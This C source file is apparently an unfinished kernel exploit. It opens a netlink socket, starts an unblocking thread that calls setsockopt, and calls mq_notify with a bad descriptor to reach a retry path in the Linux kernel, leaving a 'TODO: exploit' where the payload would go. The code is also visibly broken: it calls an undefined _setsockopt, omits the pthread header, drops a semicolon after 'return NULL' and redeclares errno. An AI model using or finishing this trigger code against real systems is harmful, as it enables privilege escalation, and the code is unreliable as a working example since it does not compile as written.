#define _GNU_SOURCE
#include <mqueue.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>


//Size of userland memory that mq_notify must read
#define NOTIFY_COOKIE_LEN (32)

//define the function to call the syscall
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)

struct unblock_thread_arg
{
    int fd;        //Sock fd to pass to setsockopt syscall
    int is_ready; // Just to check if the thread is created to unblock
};

//Thread to unblock the main thread when it reach the schedule_timeou in netlink_attachsk function
static void* unblock_thread(void* arg)
{
    struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg; //Casting the arg to the struct
    int val = 3535; // The value must be more than 0  to pass two checks
    
    uta->is_ready = 1; //The thread is created and ready to unblock the main thread 
    
    sleep(5);             //Wait 5 seconds to unblock the main thread
    
    printf("[unblock-thread] unblocking now =) \n");
    
    //Use the _setsockopt to reach a  wake_up_interruptible and unblock the main thread
    //For that porpose the level of socket (2ยบ arg) must be SOL_NETLINK
    //The optname (3ยบ arg) must be NETLINK_NO__ENOBUFS
    //And finally the optval (4ยบ arg) must be more than 0 and your size (5ยบ arg) more than sizeof(int)
    if(_setsockopt(uta->fd,  SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
        perror("setsockopt");
    return NULL
}


int main(void)
{
    struct sigevent sigeve;
    char sinval_buffer_user[NOTIFY_COOKIE_LEN];
    int sock_fd;                                        // Fd for the sock
    pthread_t tid;                                      //Pthread for thrr unblock thread
    struct unblock_thread_arg uta;                      //Struct that unblock_thread uses
    int errno;
    
    //Creating a socket file of AF_NETLINK type
    if((sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC) ) < 0)
    {
        perror("socket");
        goto fail;
    }
    printf("Netlink socket created = %d\n", sock_fd);
    
    //Initialize the sigevent struct
    memset(&sigeve, 0, sizeof(sigeve));
    
    //Setting the values of sigevent to reach thre retry logic
    sigeve.sigev_notify = SIGEV_THREAD;
    sigeve.sigev_value.sival_ptr = sinval_buffer_user;
    sigeve.sigev_signo = sock_fd;
    
    //Initialize the unblock_thread_arg struct
    memset(&uta, 0, sizeof(uta));
    uta.fd = sock_fd;                               //Set the fd that will be used in _setsockopt function
    uta.is_ready = 0;                           //Set to false, when the thread is ready that flag will be true
    
    printf("Creating pthread for unblock thread...\n");
    if((errno = pthread_create(&tid, NULL, unblock_thread, &uta)) != 0)
    {
        perror("pthread_create");
        goto fail;
    }
    while(!uta.is_ready);                           //Wait for the creation of unblock_thread
    
    printf("Unblock thread was created\n");
    //The first argument is the the fd for the message queue descriptor
    if (_mq_notify( -1, &sigeve))
      {
        perror("mqnotify");
        goto fail;
      }
      printf("mqnotify succeed\n");

      // TODO: exploit

      return 0;

    fail:
      printf("exploit failed!\n");
      return -1;    
}
